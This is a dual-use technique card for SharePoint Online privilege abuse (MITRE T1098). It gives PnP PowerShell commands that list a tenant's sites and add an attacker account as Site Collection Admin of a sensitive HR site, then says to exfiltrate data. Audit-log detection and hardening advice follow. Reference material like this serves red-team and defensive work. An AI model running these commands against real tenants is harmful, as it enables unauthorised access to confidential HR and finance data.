# [PE-ACCTMGMT-003]: SharePoint Site Collection Admin

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-003 |
| **MITRE ATT&CK v18.1** | [Account Manipulation (T1098)](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation / Data Exfiltration |
| **Platforms** | SharePoint Online |
| **Severity** | **Medium** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** SharePoint Administrators can assign themselves as "Site Collection Administrators" (SCA) to any site in the tenant. SCA permissions grant full control over the site's data, permissions, and settings. This is often used to access "Private" sites (e.g., HR, Finance, IT Secure Store) to hunt for passwords, sensitive documents, or to backdoor files (macros).
- **Attack Surface:** SharePoint Sites.
- **Business Impact:** **Data Compromise**. Accessing restricted data.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** SharePoint Administrator.
- **Tools:**
    - [PnP PowerShell](https://github.com/pnp/powershell)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: List Sites**
Find sensitive sites.
```powershell
Get-PnPTenantSite | Select Url, Title, Owner
```

**Step 2: Add Admin**
Add yourself as a Site Collection Admin.
```powershell
Set-PnPTenantSite -Url "https://corp.sharepoint.com/sites/HR" -Owners "attacker@corp.com"
```

**Step 3: Access**
Navigate to the site and exfiltrate data.

## 5. DETECTION (Blue Team Operations)

#### 5.1 SharePoint Logs
| Source | Event | Filter Logic |
|---|---|---|
| **AuditLogs** | `SiteCollectionAdminAdded` | A user adding themselves or others to the SCA group. |
| **UnifiedAuditLog** | `FileAccessed` | Mass file access events following an SCA addition. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Audit Alerts:** Create an alert for *any* addition to the "Site Collection Administrators" group for sensitive sites (HR/Finance).
*   **Information Barriers:** Use Information Barriers to technically prevent certain admins from accessing specific site segments.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-001]
> **Next Logical Step:** [IA-PASS-001]
